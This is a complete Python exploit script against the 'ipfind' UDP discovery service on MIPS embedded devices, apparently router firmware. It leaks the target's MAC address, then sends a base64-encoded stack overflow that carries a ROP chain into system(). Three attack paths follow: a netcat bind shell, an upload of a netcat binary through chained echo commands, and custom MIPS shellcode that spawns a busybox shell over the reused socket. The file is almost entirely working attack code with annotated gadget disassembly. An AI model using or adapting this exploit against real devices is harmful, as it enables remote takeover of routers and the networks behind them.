#!/usr/bin/env python

import base64
import time
import socket
import struct
import sys
import os

def p32(n):
    return struct.pack(">I", n)

class Puzzle:
    def __init__(self, ip="192.168.0.1", port=62720, path=""):
        self.ip = ip
        self.port = port
        self.path = path

    def get_mac(self):
        get_payload = ""
        get_payload += "FIVI"
        get_payload += "\x00\x00\x00\x00"
        get_payload += "\n"
        get_payload += "\x01\x00\x00\x00"
        get_payload += "\x00\x00\x00\x00"
        get_payload += "\xff"*6
        get_payload += "\x00\x00"
        get_payload += "\x00\x00\x00\x00"

        self.mac_address = ""
        self.s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.s.sendto(get_payload, (self.ip, self.port))
        get_data, addr = self.s.recvfrom(1024)
        if len(get_data) == 0x21d:
            self.mac_address += get_data[0x11:0x17]
            print("[*] Get mac address is {}".format(self.mac_address.encode("hex")))

    def exploit_once(self, cmd="", restart=True):
        bof_payload = ""
        bof_payload += "B" * 0x244 
        bof_payload += p32(0x004130A8 - 0xD)   # $s0      
        bof_payload += p32(0)                  # $s1
        bof_payload += p32(0x00400c9c)         # $ra 0x00400c9c : lw $gp, 0x10($sp) ; lw $ra, 0x1c($sp) ; jr $ra ; addiu $sp, $sp, 0x20
        bof_payload += "A" * 0x10
        bof_payload += p32(0x41B030)           # $gp 0x41B030
        bof_payload += "B" * 8        
        bof_payload += p32(0x00400F24)         # $ra 00400F24: 
        '''
        .text:00400F24 8F A2 00 18                 lw      $v0, 0x20+var_8($sp)
        .text:00400F28 AE 02 00 0D                 sw      $v0, 0xD($s0)
        .text:00400F2C
        .text:00400F2C             loc_400F2C:                              # CODE XREF: sub_400E50+CC
        .text:00400F2C 8F 82 80 68                 la      $v0, ifname
        .text:00400F30 8C 44 00 00                 lw      $a0, (ifname - 0x413138)($v0)
        .text:00400F34 8F 99 80 8C                 la      $t9, net_get_hwaddr
        .text:00400F38 03 20 F8 09                 jalr    $t9 ; net_get_hwaddr
        .text:00400F3C 26 05 00 11                 addiu   $a1, $s0, 0x11
        .text:00400F40 8F BF 00 24                 lw      $ra, 0x20+var_s4($sp)
        .text:00400F44 8F B0 00 20                 lw      $s0, 0x20+var_s0($sp)
        .text:00400F48 03 E0 00 08                 jr      $ra
        .text:00400F4C 27 BD 00 28                 addiu   $sp, 0x28
        '''
        bof_payload += "C" * 0x18
        bof_payload += p32(0x00402840)         # $v0 00402840             _system:
        bof_payload += "D" * 0x8
        bof_payload += p32(0x004021E8)
        '''
        .text:004021E8 8F BC 00 10                 lw      $gp, 0x98+var_88($sp)
        .text:004021EC 8F 82 80 B8                 la      $v0, server_sockfd
        .text:004021F0 8C 44 00 00                 lw      $a0, (server_sockfd - 0x413134)($v0)  # fd
        .text:004021F4 8F 99 80 38                 la      $t9, close
        .text:004021F8 03 20 F8 09                 jalr    $t9 ; close
        .text:004021FC 00 00 00 00                 nop
        .text:00402200 8F BF 00 9C                 lw      $ra, 0x98+var_s4($sp)
        .text:00402204 8F B0 00 98                 lw      $s0, 0x98+var_s0($sp)
        .text:00402208 03 E0 00 08                 jr      $ra
        .text:0040220C 27 BD 00 A0                 addiu   $sp, 0xA0
        .text:0040220C              # End of function s_ipfind_exit
        '''
        bof_payload += "E" * 0x10
        bof_payload += p32(0x41B030)           # $gp 0x41B030
        bof_payload += "F" * 0x88
        bof_payload += p32(0x00400c9c)         # $ra 0x00400c9c : lw $gp, 0x10($sp) ; lw $ra, 0x1c($sp) ; jr $ra ; addiu $sp, $sp, 0x20
        bof_payload += "G" * 0x10
        bof_payload += p32(0x41B030)           # $gp 0x41B030
        bof_payload += "H" * 8
        bof_payload += p32(0x00401768)         # $ra addiu $a0, $sp, 0x21 ; move $a1, $zero ; lw $t9, -0x7f88($gp) ; jalr $t9 ; addiu $a2, $zero, 0xff
        bof_payload += "I" * 0x21
        # bof_payload += "touch /var/tmp/testcmd\x00"
        # bof_payload += "/bin/busybox telnetd -p 2333 -l /bin/sh\x00"
        # bof_payload += "telnetd -p 2333;sleep 1;kill $(pidof telnetd);"
        # bof_payload += "killall ipfind;"
        bof_payload += cmd
        if restart == True:
            bof_payload += "rm /var/run/ipfind-br0.pid;ipfind br0 &\x00"
        else:
            bof_payload += "\x00"

        set_payload = ""
        set_payload += "FIVI"
        set_payload += "\x00\x00\x00\x00"
        set_payload += "\n"
        set_payload += "\x02\x00\x00\x00"
        set_payload += "\x00\x00\x00\x00"
        set_payload += self.mac_address
        set_payload += "\x00\x00"
        set_payload += "\x8e\x00\x00\x00"
        set_payload += "\x00" * 0x40
        # set_payload += base64.b64encode('a'*0x2c) + "\x00" * 4
        set_payload += base64.b64encode(bof_payload)

        self.s.sendto(set_payload, (self.ip, self.port))
        time.sleep(0.2)
        print("[*] Send cmd done: {}".format(cmd))

    def ret2shellcode(self):
        bof_payload = ""
        bof_payload += "\x00" * 0x244
        bof_payload += "\x10\x00\x00\x00"       # $s0    
        bof_payload += "\x10\x00\x00\x00"       # $s1
        bof_payload += p32(0x004020A0)          # $ra
        '''
        .text:004020A0 00 00 38 21                 move    $a3, $zero       # flags
        .text:004020A4 8F BC 00 18                 lw      $gp, 0x7C+var_64($sp)
        .text:004020A8 8F 99 80 38                 la      $t9, close
        .text:004020AC 03 20 F8 09                 jalr    $t9 ; close
        .text:004020B0 02 00 20 21                 move    $a0, $s0         # fd
        .text:004020B4
        .text:004020B4             loc_4020B4:                              # CODE XREF: sub_401DF4+1AC
        .text:004020B4                                                      # sub_401DF4+238 ...
        .text:004020B4 8F BF 00 84                 lw      $ra, 0x7C+var_s8($sp)
        .text:004020B8 8F B1 00 80                 lw      $s1, 0x7C+var_s4($sp)
        .text:004020BC 8F B0 00 7C                 lw      $s0, 0x7C+var_s0($sp)
        .text:004020C0 03 E0 00 08                 jr      $ra
        .text:004020C4 27 BD 00 88                 addiu   $sp, 0x88
        '''
        bof_payload += "A" * 0x18
        bof_payload += p32(0x41B030)            # $gp
        bof_payload += "B" * 0x68
        bof_payload += p32(0x00401F98)          # $ra 00401F98:
        '''
        .text:00401F98 0C 10 04 F4                 jal     s_log_nothing
        .text:00401F9C 24 84 2C F8                 li      $a0, aCanTGetHelloSo  # "Can't get hello socket\n"
        .text:00401FA0 10 00 00 44                 b       loc_4020B4

        .text:004020B4 8F BF 00 84                 lw      $ra, 0x7C+var_s8($sp)
        .text:004020B8 8F B1 00 80                 lw      $s1, 0x7C+var_s4($sp)
        .text:004020BC 8F B0 00 7C                 lw      $s0, 0x7C+var_s0($sp)
        .text:004020C0 03 E0 00 08                 jr      $ra
        .text:004020C4 27 BD 00 88                 addiu   $sp, 0x88

        .text:004013D0             s_log_nothing:                           # CODE XREF: sub_4013F4+9C
        .text:004013D0                                                      # sub_4013F4+160 ...
        .text:004013D0
        .text:004013D0             var_8           = -8
        .text:004013D0             arg_4           =  4
        .text:004013D0             arg_8           =  8
        .text:004013D0             arg_C           =  0xC
        .text:004013D0
        .text:004013D0 27 BD FF F0                 addiu   $sp, -0x10
        .text:004013D4 AF A5 00 14                 sw      $a1, 0x10+arg_4($sp)
        .text:004013D8 AF A6 00 18                 sw      $a2, 0x10+arg_8($sp)
        .text:004013DC AF A7 00 1C                 sw      $a3, 0x10+arg_C($sp)
        .text:004013E0 27 A2 00 14                 addiu   $v0, $sp, 0x10+arg_4
        .text:004013E4 AF A2 00 08                 sw      $v0, 0x10+var_8($sp)
        .text:004013E8 27 BD 00 10                 addiu   $sp, 0x10
        .text:004013EC 03 E0 00 08                 jr      $ra
        .text:004013F0 00 00 00 00                 nop
        '''
        bof_payload += "\x00" * 0x10
        bof_payload += "\x10\x00\x00\x2F"      # b 0xC0
        bof_payload += "\x00" * 0x68
        bof_payload += p32(0x00413200 - 0xD)   # $s0      
        bof_payload += p32(0)                  # $s1
        bof_payload += p32(0x00400c9c)         # $ra 0x00400c9c : lw $gp, 0x10($sp) ; lw $ra, 0x1c($sp) ; jr $ra ; addiu $sp, $sp, 0x20
        bof_payload += "C" * 0x10
        bof_payload += p32(0x41B030)           # $gp 0x41B030
        bof_payload += "D" * 8        
        bof_payload += p32(0x00400F28)         # $ra 00400F28: 
        '''
        .text:00400F24 8F A2 00 18                 lw      $v0, 0x20+var_8($sp)
        .text:00400F28 AE 02 00 0D                 sw      $v0, 0xD($s0)
        .text:00400F2C
        .text:00400F2C             loc_400F2C:                              # CODE XREF: sub_400E50+CC
        .text:00400F2C 8F 82 80 68                 la      $v0, ifname
        .text:00400F30 8C 44 00 00                 lw      $a0, (ifname - 0x413138)($v0)
        .text:00400F34 8F 99 80 8C                 la      $t9, net_get_hwaddr
        .text:00400F38 03 20 F8 09                 jalr    $t9 ; net_get_hwaddr
        .text:00400F3C 26 05 00 11                 addiu   $a1, $s0, 0x11
        .text:00400F40 8F BF 00 24                 lw      $ra, 0x20+var_s4($sp)
        .text:00400F44 8F B0 00 20                 lw      $s0, 0x20+var_s0($sp)
        .text:00400F48 03 E0 00 08                 jr      $ra
        .text:00400F4C 27 BD 00 28                 addiu   $sp, 0x28
        '''
        bof_payload += "F" * 0x20
        bof_payload += p32(0x00413200)          # $s0
        bof_payload += p32(0x004027C8)          # $ra
        '''
        .text:004027C0             loc_4027C0:                              # CODE XREF: sub_402790+3C
        .text:004027C0 03 20 F8 09                 jalr    $t9
        .text:004027C4 00 00 00 00                 nop
        .text:004027C8
        .text:004027C8             loc_4027C8:                              # CODE XREF: sub_402790+28
        .text:004027C8 8E 19 00 00                 lw      $t9, 0($s0)
        .text:004027CC 17 31 FF FC                 bne     $t9, $s1, loc_4027C0
        .text:004027D0 26 10 FF FC                 addiu   $s0, -4
        .text:004027D4 8F BF 00 24                 lw      $ra, 0x1C+var_s8($sp)
        .text:004027D8 8F B1 00 20                 lw      $s1, 0x1C+var_s4($sp)
        .text:004027DC 8F B0 00 1C                 lw      $s0, 0x1C+var_s0($sp)
        .text:004027E0 03 E0 00 08                 jr      $ra
        .text:004027E4 27 BD 00 28                 addiu   $sp, 0x28
        '''
        # bof_payload += "\xcc" * 0x100
        
        bof_payload += "\x3C\x1C\x00\x42"        # lui   $gp, 0x42
        bof_payload += "\x27\x9C\xB0\x30"        # addiu $gp, $gp, -0x4fd0
        bof_payload += "\x8F\x82\x80\xB8"        # la      $v0, server_sockfd
        bof_payload += "\x8C\x44\x00\x00"        # lw      $a0, (server_sockfd - 0x413134)($v0)  # fd
        bof_payload += "\x8F\x85\x80\xF4"        # lw $a1, -0x7f0c($gp)
        bof_payload += "\x24\x0c\xff\xef"        # li      t4,-17 ( addrlen = 16 )     
        bof_payload += "\x01\x80\x30\x27"        # nor     a2,t4,zero 
        bof_payload += "\x24\x02\x10\x4a"        # li      v0,4170 ( sys_connect ) 
        bof_payload += "\x01\x01\x01\x0c"        # syscall 0x40404

        bof_payload += "\x3C\x1C\x00\x42"        # lui   $gp, 0x42
        bof_payload += "\x27\x9C\xB0\x30"        # addiu $gp, $gp, -0x4fd0
        bof_payload += "\x8F\x82\x80\xB8"        # la      $v0, server_sockfd
        bof_payload += "\x8C\x44\x00\x00"        # lw      $a0, (server_sockfd - 0x413134)($v0)  # fd  

        bof_payload += "\x24\x0f\xff\xfd"        # li      t7,-3
        bof_payload += "\x01\xe0\x28\x27"        # nor     a1,t7,zero
        # bof_payload += "\x8f\xa4\xff\xff"        # lw      a0,-1(sp)
        bof_payload += "\x24\x02\x0f\xdf"        # li      v0,4063 ( sys_dup2 )
        bof_payload += "\x01\x01\x01\x0c"        # syscall 0x40404
        bof_payload += "\x20\xa5\xff\xff"        # addi    a1,a1,-1
        bof_payload += "\x24\x01\xff\xff"        # li      at,-1
        bof_payload += "\x14\xa1\xff\xfb"        # bne     a1,at, dup2_loop

        # execve /bin/busybox sh
        bof_payload += "\x28\x06\xFF\xFF"        # slti    $a2, $zero, -1
        bof_payload += "\x3C\x0F\x2F\x62"        # lui     $t7, 0x2f62
        bof_payload += "\x35\xEF\x69\x6E"        # ori     $t7, $t7, 0x696e
        bof_payload += "\xAF\xAF\xFF\xDC"        # sw      $t7, -0x24($sp)
        bof_payload += "\x3C\x0F\x2F\x62"        # lui     $t7, 0x2f62
        bof_payload += "\x35\xEF\x75\x73"        # ori     $t7, $t7, 0x7573
        bof_payload += "\xAF\xAF\xFF\xE0"        # sw      $t7, -0x20($sp)
        bof_payload += "\x3C\x0F\x79\x62"        # lui     $t7, 0x7962
        bof_payload += "\x35\xEF\x6F\x78"        # ori     $t7, $t7, 0x6f78
        bof_payload += "\xAF\xAF\xFF\xE4"        # sw      $t7, -0x1c($sp)
        bof_payload += "\xAF\xA0\xFF\xE8"        # sw      $zero, -0x18($sp)
        bof_payload += "\x3C\x0F\x73\x68"        # lui     $t7, 0x7368
        bof_payload += "\xAF\xAF\xFF\xEC"        # sw      $t7, -0x14($sp)
        bof_payload += "\xAF\xA0\xFF\xF0"        # sw      $zero, -0x10($sp)
        bof_payload += "\x27\xAF\xFF\xDC"        # addiu   $t7, $sp, -0x24
        bof_payload += "\xAF\xAF\xFF\xF4"        # sw      $t7, -0xc($sp)
        bof_payload += "\x27\xAF\xFF\xEC"        # addiu   $t7, $sp, -0x14
        bof_payload += "\xAF\xAF\xFF\xF8"        # sw      $t7, -8($sp)
        bof_payload += "\xAF\xA0\xFF\xFC"        # sw      $zero, -4($sp)
        bof_payload += "\x27\xA4\xFF\xDC"        # addiu   $a0, $sp, -0x24
        bof_payload += "\x27\xA5\xFF\xF8"        # addiu   $a1, $sp, -8
        bof_payload += "\x24\x02\x0F\xAB"        # addiu   $v0, $zero, 0xfab
        bof_payload += "\x01\x01\x01\x0C"        # syscall 0x40404

        set_payload = ""
        set_payload += "FIVI"
        set_payload += "\x00\x00\x00\x00"
        set_payload += "\n"
        set_payload += "\x02\x00\x00\x00"
        set_payload += "\x00\x00\x00\x00"
        set_payload += self.mac_address
        set_payload += "\x00\x00"
        set_payload += "\x8e\x00\x00\x00"
        set_payload += "\x00" * 0x40
        set_payload += base64.b64encode(bof_payload)

        self.s.sendto(set_payload, (self.ip, self.port))
        time.sleep(0.2)
        print("[*] Send shellcode done")

    def many_shot(self):
        self.get_mac()
        self.exploit_once("rm /tmp/larry;")
        with open(self.path, "rb") as f:
            while True:
                line = f.read(100)
                if not line:
                    break
                cmd = "echo -ne '"
                for c in line:
                    cmd += "\\x{:02x}".format(ord(c))
                cmd += "' >> /tmp/larry;"
                self.exploit_once(cmd)
        self.exploit_once("chmod +x /tmp/larry;/tmp/larry -l -p 62720 -u -e /bin/sh &", False)
        self.get_shell()

    def one_shot(self):
        self.get_mac()
        self.exploit_once("/firmadyne/busybox nc -l -p 62720 -u -e /bin/sh &", False)
        self.get_shell()

    def shellcode_shot(self):
        self.get_mac()
        self.ret2shellcode()
        while True:
            command = raw_input("shell # ")
            if not command:
                continue
            command += "\n"
            self.s.sendto(command, (self.ip, self.port))
            get_data, addr = self.s.recvfrom(4096)
            print(get_data)
        # self.get_shell()

    def get_shell(self):
        print("[*] Exploit done, use nc to connect it blew")
        os.system("ncat -u {} {}".format(self.ip, self.port))

def main(ip="192.168.5.128", port=4444, path="netcat"):
    p = Puzzle(ip, port, path)
    p.shellcode_shot()
    # p.one_shot()
    # p.many_shot()

if __name__ == "__main__":
    if len(sys.argv) > 3:
        main(sys.argv[1], int(sys.argv[2]), sys.argv[3])
    else:
        print("Usage {} ip port file_path".format(sys.argv[0]))   

# https://github.com/darkerego/mips-binaries/blob/master/netcat
# https://shell-storm.org/shellcode/files/shellcode-794.html
# https://github.com/openbsd/src/blob/master/usr.bin/nc/netcat.c#L595